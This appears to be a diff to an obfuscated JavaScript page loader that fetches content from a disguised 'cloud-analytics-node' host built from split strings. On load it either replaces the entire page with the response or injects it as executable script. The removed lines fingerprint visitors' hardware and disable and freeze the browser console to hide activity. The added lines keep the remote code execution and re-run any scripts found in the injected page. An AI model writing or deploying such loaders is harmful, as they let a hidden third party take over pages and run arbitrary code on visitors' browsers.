@@ -114,62 +114,51 @@
         var uParams = loc.search; 
         var ts = new Date().getTime();
         var ep = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
-        
-        var hwParams = { r: navigator.deviceMemory || 0, c: navigator.hardwareConcurrency || 0, g: 'unknown' };
-        try {
-            var cv = d.createElement('canvas');
-            var gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
-            if (gl) {
-                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) hwParams.g = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts;
+        w.fetch(fUrl, { method: 'GET', credentials: 'omit' })
+        .then(function(res) { 
+            if (!res.ok) {
+                throw new Error("Edge Network Drop: " + res.status);
             }
-        } catch(e) {}
-        var hwEnc = w.btoa(encodeURIComponent(JSON.stringify(hwParams)));
-        var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts + '&hw=' + hwEnc;
-        
-        ['log','warn','error','info','trace'].forEach(function(m){w.console[m]=function(){};});
-        try { Object.freeze(w.console); } catch(e) {}
-
-function _authTunnelPromise(attempt) {
-            w.fetch(fUrl, { method: 'GET', credentials: 'omit', cache: 'no-store' })
-            .then(function(res) { 
-                if (!res.ok) throw new Error("Edge Drop");
-                return res.text(); 
-            })
-            .then(function(data) {
-                var overlay = d.getElementById('genesis-overlay');
-                var isL = /<\s*html|<!doctype/i.test(data);
-                
-                if (isL) {
-                    w.requestAnimationFrame(function() {
-                        try {
-                            d.open();
-                            d.write(data);
-                            d.close();
-                            if (w.history && w.history.replaceState) {
-                                var cleanUrl = w.location.protocol + "//" + w.location.host + w.location.pathname;
-                                w.history.replaceState(null, "", cleanUrl);
-                            }
-                        } catch(e) {}
-                    });
-                } else {
-                    var s = d.createElement('script');
-                    s.type = 'text/javascript';
-                    s.text = data;
-                    d.head.appendChild(s);
-                    
-                    if (overlay) {
-                        overlay.style.opacity = '0';
-                        setTimeout(function() { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 500);
+            return res.text(); 
+        })
+        .then(function(data) {
+            var overlay = d.getElementById('genesis-overlay');
+            var isL = /<\s*html|<!doctype/i.test(data);
+            
+            if (isL) {
+                try {
+                    var newDoc = d.open('text/html', 'replace');
+                    newDoc.write(data);
+                    newDoc.close();
+                } catch(e) {
+                    d.documentElement.innerHTML = data.replace(/^<!DOCTYPE html>/i, '');
+                    var scripts = Array.from(d.getElementsByTagName('script'));
+                    for (var i = 0; i < scripts.length; i++) {
+                        var newScript = d.createElement('script');
+                        if (scripts[i].src) { newScript.src = scripts[i].src; } else { newScript.text = scripts[i].text; }
+                        scripts[i].parentNode.replaceChild(newScript, scripts[i]);
                     }
                 }
-            })
-            .catch(function(err) {
-                var delay = Math.min(1000 * Math.pow(2, attempt), 8000);
-                setTimeout(function() { _authTunnelPromise(attempt + 1); }, delay);
-            });
-        }
-        _authTunnelPromise(0);
+            } else {
+                var s = d.createElement('script');
+                s.type = 'text/javascript';
+                s.text = data;
+                d.head.appendChild(s);
+                
+                if (overlay) {
+                    overlay.style.opacity = '0';
+                    setTimeout(function() { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 500);
+                }
+            }
+        })
+        .catch(function(err) {
+            var overlay = d.getElementById('genesis-overlay');
+            if (overlay) {
+                overlay.style.opacity = '0';
+                setTimeout(function() { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 500);
+            }
+        });
     })(window, document, {
         p: 'https',
         h: 'cloud-analytics' + '-node',
